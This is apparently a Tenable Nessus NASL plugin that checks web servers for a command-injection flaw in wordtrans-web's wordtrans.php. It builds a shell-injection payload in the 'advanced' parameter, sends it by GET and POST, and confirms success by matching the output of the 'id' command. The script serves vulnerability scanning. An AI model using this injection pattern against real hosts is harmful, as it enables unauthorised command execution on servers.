#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33391);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(30027);
  script_xref(name:"OSVDB", value:"53494");

  script_name(english:"Wordtrans-web exec_wordtrans Function Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using wordtrans-web");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running wordtrans-web, a web-based front-end for
wordtrans, for translating words. 

The version of wordtrans-web installed on the remote host fails to
sanitize input to the 'advanced' parameter of the 'wordtrans.php'
script before using it in an 'passthru()' statement to execute PHP
code.  Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.scanit.net/rd/advisories/adv02" );
 script_set_attribute(attribute:"see_also", value:"http://www.scanit.net/rd/advisories/adv02_2" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-07/0004.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-07/0005.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/wordtrans", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the first issue.
  exploit = string('1";', cmd, '; true "');
  url = string(
    dir, "/wordtrans.php?",
    "command=show_desc&",
    "advanced=", urlencode(str:exploit)
  );

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if we see the command output.
  if (egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following URL :\n",
        "\n",
        build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        output = strstr(res, '<hr size="1">\r\n\r\n') - '<hr size="1">\r\n\r\n';
        output = output - strstr(output, '</body>');
        output = chomp(output);
        if (!egrep(pattern:cmd_pat, string:output)) output = res;

        report = string(
          report,
          "\n",
          "This produced the following output :\n",
          "\n",
          "  ", output
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }

  # If we're sure it's wordtrans-web and thorough tests are enabled...
  if (
    thorough_tests &&
    "wordtrans.php?noadvanced=1" >< res
  )
  {
    # Try to exploit the second issue.
    url = string(dir, "/wordtrans.php");
    postdata = string(
      "word=", SCRIPT_NAME, "&",
      "advanced=", urlencode(str:exploit)
    );

    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(res)) exit(0);

    if (egrep(pattern:cmd_pat, string:res))
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following URL :\n",
          "\n",
          build_url(port:port, qs:url), "\n",
          "\n",
          "and the following POST data :\n",
          "\n",
          "  ", str_replace(find:"&", replace:'\n  ', string:postdata), "\n"
        );
        if (report_verbosity > 1)
        {
          output = strstr(res, '<hr size="1">\r\n\r\n') - '<hr size="1">\r\n\r\n';
          output = output - strstr(output, '</body>');
          output = chomp(output);
          if (!egrep(pattern:cmd_pat, string:output)) output = res;

          report = string(
            report,
            "\n",
            "This produced the following output :\n",
            "\n",
            "  ", output
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
